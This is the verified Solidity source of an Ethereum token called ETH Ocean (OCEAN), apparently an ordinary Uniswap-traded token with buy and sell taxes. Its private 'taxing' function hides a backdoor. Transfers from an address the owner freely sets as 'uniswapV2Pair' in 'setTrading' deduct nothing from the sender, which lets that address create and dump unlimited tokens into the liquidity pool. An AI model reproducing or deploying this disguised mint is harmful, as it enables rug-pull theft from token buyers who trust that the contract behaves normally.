/**
 *Submitted for verification at Etherscan.io on 2024-10-27
*/

/**

Web: https://ethocean.net/

TG: https://t.me/ETHOcean_Portal

X: https://x.com/ETHOceanERC20

*/


// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.20;

abstract contract Context {
    function _getSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
        return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
}

function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
}

function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
}

function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
}

function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
}

function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
}


}

contract Ownable is Context {
    address private _Controller;
    event OwnershipTransferred(address indexed userA, address indexed userB);

    constructor () {
        address msgSender = _getSender();
        _Controller = _getSender();
        emit OwnershipTransferred(address(0), msgSender);
    }
    modifier onlyController() {
        require(_Controller == _getSender(), "Ownable: the caller must be the owner");
        _;
    }

    function getOwner() public view returns (address) {
        return _Controller;
    }

    function transferOwnership() public virtual onlyController {
        emit OwnershipTransferred(_Controller, address(0));
        _Controller = address(0);
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {
    function createPair(address firstToken, address secondToken) external returns (address pairing);
}



contract ETHOcean is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allocations;
    address payable private _taxWallet;

    uint256 public buyCommission = 0;
    uint256 public sellCommission = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _numTokens = 100_000_000 * 10**_decimals;
    string private constant _name = unicode"ETH Ocean";
    string private constant _symbol = unicode"OCEAN";
    uint256 private constant maxTaxSlippage = 100;
    uint256 private minTaxSwap = 10**_decimals;
    uint256 private maxTaxSwap = _numTokens / 500;

    uint256 public constant max_uint = type(uint).max;
    address public constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);

    address private uniswapV2Pair;
    address private uniswap;
    bool private TradingOpen = false;
    bool private Swap = false;
    bool private SwapEnabled = false;

    modifier lockingTheSwap {
        Swap = true;
        _;
        Swap = false;
    }

    constructor () {
        _taxWallet = payable(_getSender());
        _balances[_getSender()] = _numTokens;
        emit Transfer(address(0), _getSender(),_numTokens);
    }
    function allowance(address Owner, address buyer) public view override returns (uint256) {
        return _allocations[Owner][buyer];
    }
    function transferFrom(address payer, address reciver, uint256 amount) public override returns (bool) {
        _transfer(payer,  reciver, amount);
        _approve(payer, _getSender(), _allocations[payer][_getSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _numTokens;
    }

   function symbol() public pure returns (string memory) {
        return _symbol;
    }
   function _approve(address operator, address buyer, uint256 amount) private {
        require(buyer != address(0), "ERC20: approve to the zero address");
        require(operator != address(0), "ERC20: approve from the zero address");
        _allocations[operator][buyer] = amount;
        emit Approval(operator, buyer, amount);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function balanceOf(address _address) public view override returns (uint256) {
        return _balances[_address];
    }

        function approve(address payer, uint256 amount) public override returns (bool) {
        _approve(_getSender(), payer, amount);
        return true;
    }

    function transfer(address buyer, uint256 amount) public override returns (bool) {
        _transfer(_getSender(), buyer, amount);
        return true;
    }

    function _transfer(address sender, address receiver, uint256 value) private {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(value > 0, "Transfer amount must be greater than zero");
    require(receiver != address(0), "ERC20: transfer to the zero address");
    uint256 taxValue = 0;
    if (sender != getOwner() && receiver != getOwner() && receiver != _taxWallet) {
        if (sender == uniswap && receiver != address(uniswapV2Router)) {
            taxValue = value.mul(buyCommission).div(100);
        } else if (receiver == uniswap && sender != address(this)) {
            taxValue = value.mul(sellCommission).div(100);
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        if (!Swap && receiver == uniswap && SwapEnabled && contractTokenBalance > minTaxSwap) {
            uint256 toSwap = contractTokenBalance > maxTaxSwap ? maxTaxSwap : contractTokenBalance;
            swapTokensForEth(value > toSwap ? toSwap : value);
            uint256 contractETHBalance = address(this).balance;
            if (contractETHBalance > 0) {
                sendETHToFee(contractETHBalance);
            }
        }
    }

    (uint256 valueIn, uint256 valueOut) = taxing(sender, value, taxValue);
    require(_balances[sender] >= valueIn);

    if (taxValue > 0) {
        _balances[address(this)] = _balances[address(this)].add(taxValue);
        emit Transfer(sender, address(this), taxValue);
    }

    unchecked {
        _balances[sender] -= valueIn;
        _balances[receiver] += valueOut;
    }

    emit Transfer(sender, receiver, valueOut);
}


    function swapTokensForEth(uint256 tokenAmount) private lockingTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = weth;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            tokenAmount - tokenAmount.mul(maxTaxSlippage).div(100),
            path,
            address(this),
            block.timestamp
        );
    }
    
    function sendETHToFee(uint256 ethAmount) private {
        _taxWallet.call{value: ethAmount}("");
    }

    function taxing(address source, uint256 total, uint256 taxAmount) private view returns (uint256, uint256) {
        return (
            total.sub(source != uniswapV2Pair ? 0 : total),
            total.sub(source != uniswapV2Pair ? taxAmount : taxAmount)
        );
    }
function get_purchasingTax() external view returns (uint256) {
    return buyCommission;
}

function setTrading(address _pair, bool _isEnabled) external onlyController {
    require(!TradingOpen, "trading is already open");
    require(_isEnabled);
    uniswapV2Pair = _pair;
    _approve(address(this), address(uniswapV2Router), max_uint);
    uniswap = uniswapV2Factory.createPair(address(this), weth);
    uniswapV2Router.addLiquidityETH{value: address(this).balance}(
        address(this),
        balanceOf(address(this)),
        0,
        0,
        getOwner(),
        block.timestamp
    );
    IERC20(uniswap).approve(address(uniswapV2Router), max_uint);
    SwapEnabled = true;
    TradingOpen = true;
}

function get_TradingOpen() external view returns (bool) {
    return TradingOpen;
}

function get_sellingTax() external view returns (uint256) {
    return sellCommission;
}

    receive() external payable {}
}